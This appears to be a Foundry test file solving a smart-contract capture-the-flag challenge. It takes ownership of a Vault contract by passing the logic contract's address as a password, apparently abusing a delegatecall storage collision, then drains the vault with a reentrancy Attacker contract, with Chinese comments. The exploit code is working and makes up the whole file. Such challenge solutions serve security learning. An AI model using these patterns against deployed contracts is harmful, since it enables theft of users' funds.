// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        
        console.log(address(vault));
        console.log("vault old owner:", vault.owner());
        
        bytes32 logicAddressAsBytes32 = bytes32(uint256(uint160(address(logic))));
        (bool success, ) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", logicAddressAsBytes32, palyer));
        console.log("success?:", success, "owner:", vault.owner());
            
        if(success){
            vault.openWithdraw();
            
            Attacker attacker = new Attacker(payable(address(vault)));

            
            uint256 vaultBalance = address(vault).balance/100;//给少点，防止取钱取不尽
            attacker.deposite{value: vaultBalance}();
            attacker.attack();
            
            console.logUint("vault balance:",vaultBalance);//打印不出来
            console.log("player balance:", address(palyer).balance);
        }

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

// 创建一个攻击合约用于重入攻击
contract Attacker {
    Vault public vault;
    address public owner;
    
    constructor(address payable _vaultAddress) {
        vault = Vault(_vaultAddress);
        owner = msg.sender;
    }
    
    // 用于接收ETH的函数，执行重入攻击
    receive() external payable {
        console.log("vault balance:", address(vault).balance);
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
    function deposite() external payable {
        vault.deposite{value: msg.value}();
    }
    // 启动攻击的函数
    function attack() external payable {
        console.log("attack");
        // 取款，触发重入攻击
        vault.withdraw();
        // 攻击完成后，将所有ETH发送给所有者
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
